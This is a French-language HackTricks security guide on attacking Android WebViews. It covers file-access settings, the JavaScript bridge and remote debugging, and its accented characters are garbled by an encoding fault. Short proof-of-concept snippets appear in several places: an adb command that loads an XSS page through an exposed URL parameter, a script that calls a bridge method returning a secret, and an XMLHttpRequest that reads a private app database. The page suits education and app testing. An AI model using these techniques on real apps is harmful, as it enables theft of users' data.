# Attaques sur les WebViews

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Guide simplifi√© sur les configurations et la s√©curit√© des WebViews

### Aper√ßu des vuln√©rabilit√©s des WebViews

Un aspect critique du d√©veloppement Android implique la gestion correcte des WebViews. Ce guide met en √©vidence les configurations cl√©s et les bonnes pratiques de s√©curit√© pour att√©nuer les risques associ√©s √† l'utilisation des WebViews.

![Exemple de WebView](../../.gitbook/assets/image%20(718).png)

### **Acc√®s aux fichiers dans les WebViews**

Par d√©faut, les WebViews permettent l'acc√®s aux fichiers. Cette fonctionnalit√© est contr√¥l√©e par la m√©thode `setAllowFileAccess()`, disponible depuis le niveau d'API Android 3 (Cupcake 1.5). Les applications avec l'autorisation **android.permission.READ_EXTERNAL_STORAGE** peuvent lire des fichiers depuis le stockage externe en utilisant un sch√©ma d'URL de fichier (`file://chemin/vers/fichier`).

#### **Fonctionnalit√©s obsol√®tes : Acc√®s universel et acc√®s aux fichiers √† partir d'URL**

- **Acc√®s universel √† partir d'URL de fichier** : Cette fonctionnalit√© obsol√®te permettait des requ√™tes entre origines √† partir d'URL de fichier, posant un risque de s√©curit√© important en raison des attaques potentielles de type XSS. Le param√®tre par d√©faut est d√©sactiv√© (`false`) pour les applications ciblant Android Jelly Bean et les versions ult√©rieures.
- Pour v√©rifier ce param√®tre, utilisez `getAllowUniversalAccessFromFileURLs()`.
- Pour modifier ce param√®tre, utilisez `setAllowUniversalAccessFromFileURLs(boolean)`.

- **Acc√®s aux fichiers √† partir d'URL de fichier** : Cette fonctionnalit√©, √©galement obsol√®te, contr√¥lait l'acc√®s au contenu √† partir d'autres URL de sch√©ma de fichier. Comme l'acc√®s universel, sa valeur par d√©faut est d√©sactiv√©e pour une s√©curit√© renforc√©e.
- Utilisez `getAllowFileAccessFromFileURLs()` pour v√©rifier et `setAllowFileAccessFromFileURLs(boolean)` pour d√©finir.

#### **Chargement s√©curis√© des fichiers**

Pour d√©sactiver l'acc√®s au syst√®me de fichiers tout en acc√©dant toujours aux ressources et aux actifs, la m√©thode `setAllowFileAccess()` est utilis√©e. Avec Android R et versions ult√©rieures, le param√®tre par d√©faut est `false`.
- V√©rifiez avec `getAllowFileAccess()`.
- Activez ou d√©sactivez avec `setAllowFileAccess(boolean)`.

#### **WebViewAssetLoader**

La classe **WebViewAssetLoader** est l'approche moderne pour charger des fichiers locaux. Elle utilise des URL http(s) pour acc√©der aux ressources et aux actifs locaux, se conformant √† la politique Same-Origin, facilitant ainsi la gestion de CORS.

### **Gestion de JavaScript et du sch√©ma d'intent**

- **JavaScript** : D√©sactiv√© par d√©faut dans les WebViews, il peut √™tre activ√© via `setJavaScriptEnabled()`. Il est conseill√© de faire preuve de prudence, car activer JavaScript sans les protections ad√©quates peut introduire des vuln√©rabilit√©s de s√©curit√©.

- **Sch√©ma d'intent** : Les WebViews peuvent g√©rer le sch√©ma `intent`, ce qui peut potentiellement conduire √† des exploits s'ils ne sont pas g√©r√©s avec soin. Une vuln√©rabilit√© exemple impliquait un param√®tre WebView expos√© "support_url" qui pouvait √™tre exploit√© pour ex√©cuter des attaques de script entre sites (XSS).

![WebView vuln√©rable](../../.gitbook/assets/image%20(719).png)

Exemple d'exploitation en utilisant adb:
```bash
adb.exe shell am start -n com.tmh.vulnwebview/.SupportWebView ‚Äìes support_url "https://example.com/xss.html"
```
### Pont JavaScript

Une fonctionnalit√© est fournie par Android qui permet √† **JavaScript** dans un WebView d'invoquer des **fonctions d'application Android natives**. Cela est r√©alis√© en utilisant la m√©thode `addJavascriptInterface`, qui int√®gre JavaScript avec les fonctionnalit√©s natives d'Android, appel√© un _pont JavaScript de WebView_. Il est conseill√© de faire preuve de prudence car cette m√©thode permet √† toutes les pages dans le WebView d'acc√©der √† l'objet Interface JavaScript enregistr√©, ce qui pose un risque de s√©curit√© si des informations sensibles sont expos√©es via ces interfaces.

### Consid√©rations Importantes

- **Une prudence extr√™me est requise** pour les applications ciblant les versions d'Android inf√©rieures √† 4.2 en raison d'une vuln√©rabilit√© permettant l'ex√©cution de code √† distance via JavaScript malveillant, exploitant la r√©flexion.

#### Mise en ≈ìuvre d'un Pont JavaScript

- Les **interfaces JavaScript** peuvent interagir avec le code natif, comme le montrent les exemples o√π une m√©thode de classe est expos√©e √† JavaScript:
```javascript
@JavascriptInterface
public String getSecret() {
return "SuperSecretPassword";
};
```
- Le JavaScript Bridge est activ√© en ajoutant une interface √† la WebView :
```javascript
webView.addJavascriptInterface(new JavascriptBridge(), "javascriptBridge");
webView.reload();
```
- Potentiel d'exploitation via JavaScript, par exemple, via une attaque XSS, permet d'appeler des m√©thodes Java expos√©es:
```html
<script>alert(javascriptBridge.getSecret());</script>
```
- Pour att√©nuer les risques, **limitez l'utilisation du pont JavaScript** au code livr√© avec l'APK et emp√™chez le chargement de JavaScript √† partir de sources distantes. Pour les anciens appareils, d√©finissez le niveau API minimum √† 17.

### Ex√©cution de code √† distance (RCE) bas√©e sur la r√©flexion

- Une m√©thode document√©e permet d'atteindre une RCE gr√¢ce √† la r√©flexion en ex√©cutant une charge utile sp√©cifique. Cependant, l'annotation `@JavascriptInterface` emp√™che l'acc√®s non autoris√© aux m√©thodes, limitant la surface d'attaque.

### D√©bogage √† distance

- Le **d√©bogage √† distance** est possible avec **Chrome Developer Tools**, permettant l'interaction et l'ex√©cution arbitraire de JavaScript dans le contenu de WebView.

#### Activation du d√©bogage √† distance

- Le d√©bogage √† distance peut √™tre activ√© pour tous les WebViews dans une application en :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
WebView.setWebContentsDebuggingEnabled(true);
}
```
- Pour activer conditionnellement le d√©bogage en fonction de l'√©tat de d√©bogage de l'application :
```java
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
if (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE))
{ WebView.setWebContentsDebuggingEnabled(true); }
}
```
## Exfiltrer des fichiers arbitraires

- D√©montre l'exfiltration de fichiers arbitraires en utilisant un XMLHttpRequest :
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
alert(xhr.responseText);
}
}
xhr.open('GET', 'file:///data/data/com.authenticationfailure.wheresmybrowser/databases/super_secret.db', true);
xhr.send(null);
```
## R√©f√©rences
* [https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
* [https://github.com/authenticationfailure/WheresMyBrowser.Android](https://github.com/authenticationfailure/WheresMyBrowser.Android)
* [https://developer.android.com/reference/android/webkit/WebView](https://developer.android.com/reference/android/webkit/WebView)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>
